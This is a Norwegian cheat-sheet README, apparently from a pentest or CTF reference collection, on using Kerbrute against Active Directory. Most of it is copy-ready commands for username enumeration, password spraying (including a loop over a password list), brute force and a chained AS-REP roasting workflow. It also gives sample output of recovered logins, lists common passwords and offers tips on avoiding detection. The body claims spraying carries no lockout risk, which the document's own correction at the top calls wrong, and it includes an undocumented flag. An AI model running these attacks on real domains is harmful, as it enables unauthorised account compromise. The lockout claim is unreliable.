# 🔑 Kerbrute – brukerkartlegging med Kerberos

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

> **Viktig rettelse om kontolåsing:** Påstanden «ingen risiko for kontolåsing» gjelder ikke passordspraying eller brute force. `userenum` identifiserer brukere uten å teste passord; passordforsøk kan øke feiltellere, låse kontoer og generere Kerberos-hendelser. Forsinkelse eller fem minutters venting er ingen generell garanti. Den opprinnelige tabellen er derfor for generell. [Kerbrute: bruk og logging](https://github.com/ropnop/kerbrute#usage).
>
> **Eksempelmerknad:** `bruteuser` prøver passord mot én bruker; kommentaren om alle bruker-/passordkombinasjoner beskriver ikke dette eksempelet presist. Originalens versjonslenke og flagg er beholdt, men blant annet `--json` er ikke dokumentert i prosjektets viste flaggliste. En loggfil med statusmeldinger er heller ikke nødvendigvis en ren brukernavnliste til neste verktøy. [Offisiell Kerbrute-referanse](https://github.com/ropnop/kerbrute).

```
  ██╗  ██╗███████╗██████╗ ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
  ██║ ██╔╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
  █████╔╝ █████╗  ██████╔╝██████╔╝██████╔╝██║   ██║   ██║   █████╗  
  ██╔═██╗ ██╔══╝  ██╔══██╗██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
  ██║  ██╗███████╗██║  ██║██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
           Verktøy for brute force mot Kerberos-forhåndsautentisering
```

<p align="center">
  <img src="https://img.shields.io/badge/Kerbrute-Kerberos-red?style=for-the-badge" alt="Kerbrute">
  <img src="https://img.shields.io/badge/User_Enumeration-blue?style=for-the-badge" alt="Enum">
  <img src="https://img.shields.io/badge/Password_Spray-green?style=for-the-badge" alt="Spray">
</p>

---

## 📋 Innholdsfortegnelse

- [Hva er Kerbrute](#-hva-er-kerbrute)
- [Installasjon](#-installasjon)
- [Brukerkartlegging](#-brukerkartlegging)
- [Passordspraying](#-passordspraying)
- [Brute force](#-brute-force)
- [Hurtigreferanse](#-hurtigreferanse)
- [CTF-tips](#-ctf-tips)
- [Ressurser](#-ressurser)

---

## 🎯 Hva er Kerbrute

**Kerbrute** misbruker Kerberos-forhåndsautentisering til å kartlegge brukere og spraye passord:

- 🔍 **Brukerkartlegging** – Finn gyldige brukernavn uten legitimasjon!
- 🔐 **Passordspraying** – Test ett passord mot mange brukere
- 💥 **Brute force** – Systematisk testing av legitimasjon
- 🚫 **Ingen risiko for kontolåsing** – Feil ved forhåndsautentisering utløser ikke låsing

### Hvorfor Kerbrute?

| Metode | Utløser kontolåsing | Logger genereres |
|--------|------------------|----------------|
| LDAP-binding | Ja | Ja |
| SMB-autentisering | Ja | Ja |
| **Kerberos-forhåndsautentisering** | **Nei** | Minimalt |

---

## 🚀 Installasjon

### Last ned binærfil

```bash
# Linux
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

# Windows (PowerShell)
Invoke-WebRequest -Uri "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe" -OutFile kerbrute.exe
```

### Fra kildekode

```bash
go install github.com/ropnop/kerbrute@latest
```

### Verifiser

```bash
kerbrute --help
```

---

## 🔍 Brukerkartlegging

### Grunnleggende bruk

```bash
# Kartlegg brukere fra ordliste
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt

# Med domenekontrollerens vertsnavn
kerbrute userenum -d domain.local --dc dc01.domain.local users.txt
```

### Utdatavalg

```bash
# Detaljerte utdata
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -v

# Skriv til fil
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -o valid_users.txt

# JSON-utdata
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt --json -o results.json
```

### Tråder

```bash
# Øk antall tråder (standard: 10)
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -t 50

# Forsiktig bruk av tråder
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -t 20 --delay 100
```

### Eksempel på utdata

```
2024/01/15 10:30:00 >  [+] VALID USERNAME:    admin@domain.local
2024/01/15 10:30:01 >  [+] VALID USERNAME:    john@domain.local
2024/01/15 10:30:02 >  [+] VALID USERNAME:    svc_sql@domain.local
```

---

## 🔐 Passordspraying

### Grunnleggende spraying

```bash
# Ett passord mot flere brukere
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password123!'

# Fra fil
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Summer2024!'
```

### Flere passord

```bash
# Spray flere passord (ett om gangen!)
for pass in $(cat passwords.txt); do
    echo "Trying: $pass"
    kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt "$pass"
    sleep 300  # Vent 5 minutter mellom sprayingene
done
```

### Utdata

```bash
# Skriv ut gyldig legitimasjon
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Pass123!' -o valid_creds.txt
```

### Eksempel på utdata

```
2024/01/15 10:35:00 >  [+] VALID LOGIN:    john@domain.local:Password123!
2024/01/15 10:35:01 >  [+] VALID LOGIN:    admin@domain.local:Password123!
```

### Forsiktig spraying

```bash
# Kontroller passordpolicyen først!
crackmapexec ldap DC01 -u user -p pass --password-policy

# Lav hastighet og lite støy
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Pass!' -t 5 --delay 500
```

---

## 💥 Brute force

### Full brute force

```bash
# Test alle kombinasjoner av brukernavn:passord
kerbrute bruteuser -d domain.local --dc 10.10.10.10 passwords.txt admin
```

### Kombinert liste

```bash
# Med formatet username:password
kerbrute bruteforce -d domain.local --dc 10.10.10.10 creds.txt

# Format for creds.txt:
# admin:Password1
# john:Summer2024
```

---

## 📊 Hurtigreferanse

### Kommandoer

| Kommando | Beskrivelse |
|---------|-------------|
| `userenum` | Kartlegg gyldige brukernavn |
| `passwordspray` | Test passord mot brukere |
| `bruteuser` | Brute force mot én bruker |
| `bruteforce` | Test kombinasjoner av bruker:passord |

### Viktige alternativer

| Alternativ | Beskrivelse |
|--------|-------------|
| `-d` | Domenenavn |
| `--dc` | Domenekontrollerens IP/vertsnavn |
| `-t` | Tråder (standard: 10) |
| `-o` | Utdatafil |
| `-v` | Detaljerte utdata |
| `--delay` | Forsinkelse mellom forsøk (ms) |

### Brukerkartlegging

```bash
# Grunnleggende
kerbrute userenum -d DOMAIN --dc DC_IP users.txt

# Med utdata
kerbrute userenum -d DOMAIN --dc DC_IP users.txt -o valid.txt

# Raskt
kerbrute userenum -d DOMAIN --dc DC_IP users.txt -t 50
```

### Passordspraying

```bash
# Grunnleggende spraying
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Password!'

# Forsiktig spraying
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Pass!' -t 5 --delay 500
```

### Ordlister for brukerkartlegging

```bash
# Vanlige navn
/usr/share/seclists/Usernames/Names/names.txt

# Mest brukte brukernavn
/usr/share/seclists/Usernames/top-usernames-shortlist.txt

# Eget format
echo -e "administrator\nadmin\nuser\njohn\njane" > users.txt
```

### Vanlige passord

```
Årstid+år: Summer2024!, Winter2024!, Fall2024!
Firma+tall: CompanyName123!, Company2024!
Generelle: Password1, Welcome1, P@ssw0rd
```

---

## 🎯 CTF-tips

1. **Kartlegg alltid først** – Brukernavn uten legitimasjon!
2. **Kontroller AS-REP** – Se etter brukere uten forhåndsautentisering etter at brukerne er funnet
3. **Spray forsiktig** – Ett passord, og vent deretter
4. **Kontroller policyen** – Kjenn terskelen for kontolåsing
5. **Bruk forsinkelse** – Unngå oppdagelse

### Arbeidsflyt

```bash
# 1. Kartlegg brukere
kerbrute userenum -d domain.local --dc 10.10.10.10 names.txt -o users.txt

# 2. Se etter kontoer utsatt for AS-REP roasting
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass

# 3. Passordspraying
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Summer2024!'
```

---

## 📚 Ressurser

- [Kerbrute GitHub](https://github.com/ropnop/kerbrute)
- [ropnop Blog](https://blog.ropnop.com/)

### Relaterte hurtigreferanser
- [AD-metodikk](../../AD-Attack-Methodology/translations/README.nb.md)
- [Rubeus](../../Rubeus/translations/README.nb.md)
- [CrackMapExec](../../CrackMapExec/translations/README.nb.md)

---

<p align="center">
  <b>🔑 Kartlegg brukere og spray passord!</b><br>
  <i>Kerbrute – en diskret vei inn</i>
</p>
